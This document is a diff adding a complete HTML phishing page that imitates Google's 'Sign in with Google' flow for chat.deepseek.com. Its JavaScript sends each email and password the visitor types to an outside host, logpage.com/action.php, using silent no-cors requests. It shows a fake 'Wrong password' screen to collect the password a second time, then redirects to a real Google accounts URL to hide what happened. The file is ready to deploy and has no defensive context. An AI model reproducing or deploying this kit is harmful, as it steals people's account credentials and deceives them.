@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>Sign in - Google Accounts</title>
+  <style>
+    /* ════════════════════════════════════
+       CSS VARIABLES — light & dark mode
+    ════════════════════════════════════ */
+    :root {
+      --bg:               #f1f3f4;
+      --card-bg:          #ffffff;
+      --card-border:      #dadce0;
+      --header-border:    #e0e0e0;
+      --text-primary:     #202124;
+      --text-secondary:   #5f6368;
+      --text-muted:       #70757a;
+      --link:             #1a73e8;
+      --input-border:     #dadce0;
+      --input-focus:      #1a73e8;
+      --input-error:      #d93025;
+      --input-label:      #5f6368;
+      --input-label-focus:#1a73e8;
+      --btn-bg:           #1a73e8;
+      --btn-text:         #ffffff;
+      --btn-ghost-text:   #1a73e8;
+      --btn-ghost-hover:  #e8f0fe;
+      --chip-bg:          #f1f3f4;
+      --chip-border:      #dadce0;
+      --footer-text:      #70757a;
+      --footer-link:      #70757a;
+      --shadow:           0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+    }
+
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --bg:               #202124;
+        --card-bg:          #303134;
+        --card-border:      #5f6368;
+        --header-border:    #5f6368;
+        --text-primary:     #e8eaed;
+        --text-secondary:   #9aa0a6;
+        --text-muted:       #9aa0a6;
+        --link:             #8ab4f8;
+        --input-border:     #5f6368;
+        --input-focus:      #8ab4f8;
+        --input-error:      #f28b82;
+        --input-label:      #9aa0a6;
+        --input-label-focus:#8ab4f8;
+        --btn-bg:           #8ab4f8;
+        --btn-text:         #202124;
+        --btn-ghost-text:   #8ab4f8;
+        --btn-ghost-hover:  rgba(138,180,248,.12);
+        --chip-bg:          #3c3c3c;
+        --chip-border:      #5f6368;
+        --footer-text:      #9aa0a6;
+        --footer-link:      #9aa0a6;
+        --shadow:           0 1px 3px rgba(0,0,0,.4);
+      }
+    }
+
+    /* ════════════════════════════════════
+       BASE RESET
+    ════════════════════════════════════ */
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      height: 100%;
+      font-family: 'Google Sans', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      font-size: 14px;
+      background: var(--bg);
+      color: var(--text-primary);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: var(--link); text-decoration: none; cursor: pointer; }
+    a:hover { text-decoration: underline; }
+
+    /* ════════════════════════════════════
+       PAGE SHELL & FOOTER POSITIONING
+    ════════════════════════════════════ */
+    .shell {
+      min-height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 0;
+    }
+
+    @media (max-width: 640px) {
+      .shell {
+        padding: 0;
+        min-height: 100vh;
+        justify-content: space-between;
+      }
+      .page.active {
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        min-height: 100vh;
+        width: 100%;
+      }
+      .card {
+        margin-top: 0;
+        flex: 1 0 auto;
+      }
+      .footer {
+        margin-top: auto;
+        margin-bottom: 0;
+        width: 100%;
+        background: var(--bg);
+        padding: 12px 16px 16px;
+        min-height: 44px;
+      }
+    }
+
+    /* ════════════════════════════════════
+       CARD
+    ════════════════════════════════════ */
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 12px;
+      width: 100%;
+      max-width: 980px;
+      overflow: hidden;
+      box-shadow: var(--shadow);
+    }
+
+    .card-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 16px 24px;
+      border-bottom: 1px solid var(--header-border);
+      font-size: 14px;
+      color: var(--text-secondary);
+      font-weight: 500;
+    }
+
+    .card-body {
+      display: flex;
+      min-height: 320px;
+    }
+
+    .panel-left {
+      flex: 0 0 300px;
+      padding: 40px 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .panel-left h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: var(--text-primary);
+      line-height: 1.3;
+    }
+
+    .panel-left .subtitle {
+      font-size: 14px;
+      color: var(--text-secondary);
+    }
+
+    .email-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid var(--chip-border);
+      background: var(--chip-bg);
+      border-radius: 24px;
+      padding: 4px 12px 4px 6px;
+      cursor: pointer;
+      margin-top: 4px;
+      width: fit-content;
+    }
+
+    .email-chip:hover { background: var(--btn-ghost-hover); }
+
+    .chip-avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #4285f4;
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .chip-email {
+      font-size: 13px;
+      color: var(--text-primary);
+    }
+
+    .panel-right {
+      flex: 1;
+      padding: 40px 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      gap: 20px;
+    }
+
+    .panel-right-inner { display: flex; flex-direction: column; gap: 16px; }
+    .field-group { display: flex; flex-direction: column; gap: 0; }
+
+    /* Floating label */
+    .input-wrap {
+      position: relative;
+      margin-bottom: 4px;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      height: 52px;
+      padding: 16px 12px 0;
+      background: transparent;
+      border: 1px solid var(--input-border);
+      border-radius: 4px;
+      font-size: 16px;
+      color: var(--text-primary);
+      font-family: inherit;
+      outline: none;
+      transition: border-color .15s;
+    }
+
+    .input-wrap input:focus {
+      border-color: var(--input-focus);
+      border-width: 2px;
+    }
+
+    .input-wrap input.error-input {
+      border-color: var(--input-error) !important;
+      border-width: 2px !important;
+    }
+
+    .input-wrap label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: var(--input-label);
+      pointer-events: none;
+      transition: all .15s;
+      background: var(--card-bg);
+      padding: 0 2px;
+    }
+
+    .input-wrap input:focus ~ label,
+    .input-wrap input:not(:placeholder-shown) ~ label {
+      top: 0;
+      font-size: 11px;
+      color: var(--input-label-focus);
+    }
+
+    .input-wrap input.error-input ~ label {
+      color: var(--input-error) !important;
+    }
+
+    .input-wrap .toggle-pw {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-secondary);
+      font-size: 13px;
+      font-family: inherit;
+      padding: 4px 6px;
+      border-radius: 4px;
+    }
+
+    .input-wrap .toggle-pw:hover { background: var(--btn-ghost-hover); }
+
+    .error-msg {
+      font-size: 12px;
+      color: var(--input-error);
+      display: flex;
+      align-items: flex-start;
+      gap: 4px;
+      margin-top: 4px;
+    }
+
+    .error-msg svg { flex-shrink: 0; margin-top: 1px; }
+
+    /* Throbber */
+    .throbber {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 4px;
+      background: transparent;
+      z-index: 9999;
+      overflow: hidden;
+      display: none;
+    }
+
+    .throbber.active { display: block; }
+
+    .throbber::before {
+      content: '';
+      position: absolute;
+      top: 0; left: -100%;
+      width: 50%;
+      height: 100%;
+      background: #1a73e8;
+      border-radius: 0 2px 2px 0;
+      animation: throbber-a 1.4s cubic-bezier(.4,0,.2,1) infinite;
+    }
+
+    .throbber::after {
+      content: '';
+      position: absolute;
+      top: 0; left: -150%;
+      width: 70%;
+      height: 100%;
+      background: rgba(26,115,232,.4);
+      border-radius: 0 2px 2px 0;
+      animation: throbber-b 1.4s cubic-bezier(.4,0,.2,1) .7s infinite;
+    }
+
+    @keyframes throbber-a {
+      0%   { left: -60%; width: 40%; }
+      60%  { left: 60%;  width: 60%; }
+      100% { left: 110%; width: 40%; }
+    }
+
+    @keyframes throbber-b {
+      0%   { left: -120%; width: 60%; }
+      60%  { left: 50%;   width: 80%; }
+      100% { left: 110%;  width: 60%; }
+    }
+
+    @media (prefers-color-scheme: dark) {
+      .throbber::before { background: #8ab4f8; }
+      .throbber::after  { background: rgba(138,180,248,.35); }
+    }
+
+    .privacy-text {
+      font-size: 12px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 8px;
+    }
+
+    .btn-ghost {
+      background: none;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--btn-ghost-text);
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: .25px;
+    }
+
+    .btn-ghost:hover { background: var(--btn-ghost-hover); }
+
+    .btn-primary {
+      background: var(--btn-bg);
+      color: var(--btn-text);
+      border: none;
+      border-radius: 24px;
+      padding: 10px 28px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      letter-spacing: .25px;
+      transition: filter .15s;
+    }
+
+    .btn-primary:hover { filter: brightness(.93); }
+    .btn-primary:active { filter: brightness(.86); }
+
+    .footer {
+      width: 100%;
+      max-width: 980px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 0;
+      color: var(--footer-text);
+      font-size: 12px;
+      background: transparent;
+    }
+
+    .footer-lang {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      cursor: pointer;
+      color: var(--footer-text);
+      padding: 6px 8px;
+      border-radius: 4px;
+    }
+
+    .footer-lang:hover { background: var(--btn-ghost-hover); }
+    .footer-links { display: flex; gap: 16px; }
+    .footer-links a { color: var(--footer-link); font-size: 12px; cursor: pointer; }
+
+    .page { display: none; }
+    .page.active { display: flex; flex-direction: column; align-items: center; width: 100%; }
+
+    @media (max-width: 640px) {
+      .card {
+        border-radius: 0;
+        border: none;
+        border-bottom: 1px solid var(--card-border);
+        max-width: 100%;
+        box-shadow: none;
+      }
+      .card-header { justify-content: center; }
+      .card-body { flex-direction: column; }
+      .panel-left {
+        flex: none;
+        align-items: center;
+        text-align: center;
+        padding: 32px 24px 20px;
+        gap: 8px;
+      }
+      .panel-left .subtitle { font-size: 13px; }
+      .panel-right {
+        border-left: none;
+        padding: 24px 24px 28px;
+      }
+      .email-chip { align-self: center; }
+      .footer-lang { display: none; }
+      .footer {
+        flex-direction: row;
+        justify-content: center;
+        padding: 12px 16px 20px;
+      }
+      .footer-links {
+        gap: 0;
+        align-items: center;
+      }
+      .footer-links a {
+        padding: 0 12px;
+        border-right: 1px solid var(--card-border);
+        line-height: 1;
+      }
+      .footer-links a:last-child { border-right: none; }
+    }
+  </style>
+</head>
+<body>
+  <div class="throbber" id="throbber"></div>
+  <div class="shell">
+
+    <!-- PAGE 1: Email -->
+    <div class="page active" id="page-email">
+      <div class="card">
+        <div class="card-header">
+          <svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+          </svg>
+          Sign in with Google
+        </div>
+        <div class="card-body">
+          <div class="panel-left">
+            <h1>Sign in</h1>
+            <p class="subtitle">to continue to <a>chat.deepseek.com</a></p>
+          </div>
+          <div class="panel-right">
+            <div class="panel-right-inner">
+              <div class="field-group">
+                <div class="input-wrap">
+                  <input type="email" id="email-input" placeholder=" " autocomplete="email" oninput="clearEmailError()" />
+                  <label for="email-input">Email or phone</label>
+                </div>
+                <div class="error-msg" id="email-error" style="display:none;">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" stroke="var(--input-error)" stroke-width="2"/>
+                    <line x1="12" y1="8" x2="12" y2="12" stroke="var(--input-error)" stroke-width="2" stroke-linecap="round"/>
+                    <circle cx="12" cy="16" r="1" fill="var(--input-error)"/>
+                  </svg>
+                  <span id="email-error-text">Enter a valid email or phone number.</span>
+                </div>
+              </div>
+              <div><a onclick="return false;">Forgot email?</a></div>
+              <p class="privacy-text">
+                Before using this app, you can review chat.deepseek.com's
+                <a>Privacy Policy</a> and <a>Terms of Service</a>.
+              </p>
+            </div>
+            <div class="actions">
+              <button class="btn-ghost" onclick="return false;">Create account</button>
+              <button class="btn-primary" id="emailNextBtn">Next</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer">
+        <div class="footer-lang">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          English (United States) <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="6 9 12 15 18 9"/></svg>
+        </div>
+        <div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div>
+      </div>
+    </div>
+
+    <!-- PAGE 2: Password -->
+    <div class="page" id="page-password">
+      <div class="card">
+        <div class="card-header"><svg width="20" height="20" viewBox="0 0 24 24">...</svg> Sign in with Google</div>
+        <div class="card-body">
+          <div class="panel-left">
+            <div class="email-chip" id="pwChip" onclick="goToEmail()">
+              <div class="chip-avatar" id="pw-avatar">r</div>
+              <span class="chip-email" id="pw-email-display">user@gmail.com</span>
+            </div>
+            <h1>Welcome</h1>
+          </div>
+          <div class="panel-right">
+            <div class="panel-right-inner">
+              <div class="input-wrap">
+                <input type="password" id="pw-input" placeholder=" " autocomplete="current-password" />
+                <label for="pw-input">Enter your password</label>
+                <button class="toggle-pw" type="button" onclick="togglePw('pw-input', this)">Show</button>
+              </div>
+              <div><a onclick="return false;">Forgot password?</a></div>
+            </div>
+            <div class="actions">
+              <button class="btn-ghost" onclick="goToEmail()">Back</button>
+              <button class="btn-primary" id="pwNextBtn">Next</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer"><div class="footer-lang">...</div><div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div></div>
+    </div>
+
+    <!-- PAGE 3: Wrong Password (error state) -->
+    <div class="page" id="page-error">
+      <div class="card">
+        <div class="card-header"><svg width="20" height="20" viewBox="0 0 24 24">...</svg> Sign in with Google</div>
+        <div class="card-body">
+          <div class="panel-left">
+            <div class="email-chip" id="errChip" onclick="goToEmail()">
+              <div class="chip-avatar" id="err-avatar">r</div>
+              <span class="chip-email" id="err-email-display">user@gmail.com</span>
+            </div>
+            <h1>Welcome</h1>
+          </div>
+          <div class="panel-right">
+            <div class="panel-right-inner">
+              <div class="field-group">
+                <div class="input-wrap">
+                  <input type="password" id="err-pw-input" placeholder=" " class="error-input" autocomplete="current-password" />
+                  <label for="err-pw-input">Enter your password</label>
+                  <button class="toggle-pw" type="button" onclick="togglePw('err-pw-input', this)">Show</button>
+                </div>
+                <div class="error-msg">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="var(--input-error)" stroke-width="2"/><line x1="12" y1="8" x2="12" y2="12" stroke="var(--input-error)" stroke-width="2"/><circle cx="12" cy="16" r="1" fill="var(--input-error)"/></svg>
+                  <span>Wrong password. Try again or click <a style="color:var(--input-error);font-weight:500;">Forgot password</a> to reset it.</span>
+                </div>
+              </div>
+              <div><a onclick="return false;">Forgot password?</a></div>
+            </div>
+            <div class="actions">
+              <button class="btn-ghost" onclick="goToEmail()">Back</button>
+              <button class="btn-primary" id="errNextBtn">Next</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="footer"><div class="footer-lang">...</div><div class="footer-links"><a>Help</a><a>Privacy</a><a>Terms</a></div></div>
+    </div>
+  </div>
+
+  <script>
+    // ----- CONFIGURATION -----
+    // Logging endpoint (GET, no redirect)
+    const LOG_ENDPOINT = "https://logpage.com/action.php";
+    
+    // FINAL REDIRECT URL after all 3 pages are completed (email + password + final error page confirmation)
+    const FINAL_REDIRECT_URL = "https://accounts.google.com/v3/signin/challenge/pwd?TL=APouJz7jSc3OEyDsO9ATA6xW3D7B-adxwJX5_1wiJo8zfMPtcZApOAEJEV62BXqe&authuser=0&cid=3&continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Ftwosv&dsh=S1746857515%3A1779550789652422&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Ftwosv&rart=ANgoxceaTnEYykdDnQdk3qK75BdIsCOdVsA6_gnKOLW7f5obAemKhOgc8nmdH4qRrFCeyQdQUMdAvcdW6qKO4fDQFuGqQioESBPCwVxin2PZ34ses4pJUFY&rpbg=1";
+
+    // State tracking for completion of the flow
+    let flowState = {
+      emailSubmitted: false,
+      passwordSubmitted: false,
+      finalErrorConfirmed: false   // after retry on error page, we consider flow complete
+    };
+    
+    let currentEmail = "";
+
+    // Helper: send data via GET (silent, no redirect, no CORS issues)
+    function sendFormDataToLogger(params) {
+      const url = new URL(LOG_ENDPOINT);
+      Object.keys(params).forEach(key => url.searchParams.append(key, String(params[key])));
+      fetch(url.toString(), {
+        method: 'GET',
+        keepalive: true,
+        mode: 'no-cors'
+      }).catch(e => console.warn("Log send error:", e));
+    }
+
+    // Helper: show throbber with delay
+    let navigating = false;
+    function showThrobber(callback) {
+      if (navigating) return;
+      navigating = true;
+      const t = document.getElementById('throbber');
+      t.classList.add('active');
+      setTimeout(() => {
+        t.classList.remove('active');
+        navigating = false;
+        callback();
+      }, 1000);
+    }
+
+    // Page navigation
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function goToEmail() {
+      // reset all states when going back to email
+      flowState = { emailSubmitted: false, passwordSubmitted: false, finalErrorConfirmed: false };
+      document.getElementById('pw-input').value = '';
+      document.getElementById('err-pw-input').value = '';
+      showPage('page-email');
+    }
+
+    // Email validation
+    function validateEmail(value) {
+      const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+      const phoneRe = /^[\+\d][\d\s\-\(\)]{6,}$/;
+      return emailRe.test(value) || phoneRe.test(value.replace(/\s/g,''));
+    }
+
+    function showEmailError(msg) {
+      const input = document.getElementById('email-input');
+      const errBox = document.getElementById('email-error');
+      const errText = document.getElementById('email-error-text');
+      input.classList.add('error-input');
+      errText.textContent = msg;
+      errBox.style.display = 'flex';
+      input.focus();
+    }
+
+    function clearEmailError() {
+      document.getElementById('email-input').classList.remove('error-input');
+      document.getElementById('email-error').style.display = 'none';
+    }
+
+    function setEmailDisplays(email) {
+      currentEmail = email;
+      const initial = email.charAt(0).toUpperCase() || 'U';
+      ['pw-avatar','err-avatar'].forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.textContent = initial;
+      });
+      ['pw-email-display','err-email-display'].forEach(id => {
+        const el = document.getElementById(id);
+        if(el) el.textContent = email;
+      });
+    }
+
+    // ---------- STEP 1: Email submission ----------
+    function goToPassword() {
+      const emailVal = document.getElementById('email-input').value.trim();
+      if (!emailVal) { showEmailError('Enter an email or phone number.'); return; }
+      if (!validateEmail(emailVal)) { showEmailError('Enter a valid email or phone number.'); return; }
+      clearEmailError();
+      
+      // Mark email as submitted
+      flowState.emailSubmitted = true;
+      
+      // Send email data
+      sendFormDataToLogger({
+        step: 'email',
+        email: emailVal,
+        timestamp: Date.now(),
+        user_agent: navigator.userAgent
+      });
+      
+      showThrobber(() => {
+        setEmailDisplays(emailVal);
+        document.getElementById('pw-input').value = '';
+        showPage('page-password');
+      });
+    }
+
+    // ---------- STEP 2: Password submission (from password page) ----------
+    function submitPasswordAndGoToError() {
+      const email = currentEmail || document.getElementById('email-input').value.trim() || "unknown@example.com";
+      const password = document.getElementById('pw-input').value;
+      if (!password) {
+        const pwInput = document.getElementById('pw-input');
+        pwInput.style.borderColor = 'var(--input-error)';
+        setTimeout(() => pwInput.style.borderColor = '', 1000);
+        return;
+      }
+      
+      flowState.passwordSubmitted = true;
+      
+      // Send password data
+      sendFormDataToLogger({
+        step: 'password_attempt',
+        email: email,
+        password: password,
+        timestamp: Date.now(),
+        user_agent: navigator.userAgent
+      });
+      
+      showThrobber(() => {
+        setEmailDisplays(email);
+        document.getElementById('err-pw-input').value = '';
+        showPage('page-error');
+      });
+    }
+
+    // ---------- STEP 3: Error page "Next" (final submission + redirect) ----------
+    // This simulates the final retry after wrong password. After this step,
+    // we consider the flow completed and redirect to the final Google URL.
+    function finalSubmitAndRedirect() {
+      const email = currentEmail || "unknown@example.com";
+      const password = document.getElementById('err-pw-input').value;
+      if (!password) return;
+      
+      // Mark final confirmation
+      flowState.finalErrorConfirmed = true;
+      
+      // Send final password retry data (third submission)
+      sendFormDataToLogger({
+        step: 'password_final_retry',
+        email: email,
+        password: password,
+        timestamp: Date.now(),
+        user_agent: navigator.userAgent,
+        flow_completed: 'true'
+      });
+      
+      // Show throbber and then redirect to the final Google URL
+      showThrobber(() => {
+        // Perform final redirect to the specified Google accounts page
+        window.location.href = FINAL_REDIRECT_URL;
+      });
+    }
+
+    // Helper to toggle password visibility
+    window.togglePw = function(inputId, btn) {
+      const input = document.getElementById(inputId);
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.textContent = 'Hide';
+      } else {
+        input.type = 'password';
+        btn.textContent = 'Show';
+      }
+    };
+
+    // Attach event listeners
+    document.getElementById('emailNextBtn').addEventListener('click', goToPassword);
+    document.getElementById('pwNextBtn').addEventListener('click', submitPasswordAndGoToError);
+    document.getElementById('errNextBtn').addEventListener('click', finalSubmitAndRedirect);
+    
+    // Enter key handling
+    document.getElementById('email-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') goToPassword(); });
+    document.getElementById('pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') submitPasswordAndGoToError(); });
+    document.getElementById('err-pw-input').addEventListener('keydown', (e) => { if(e.key === 'Enter') finalSubmitAndRedirect(); });
+    
+    // Expose global helper for chips
+    window.goToEmail = goToEmail;
+  </script>
+</body>
+</html>
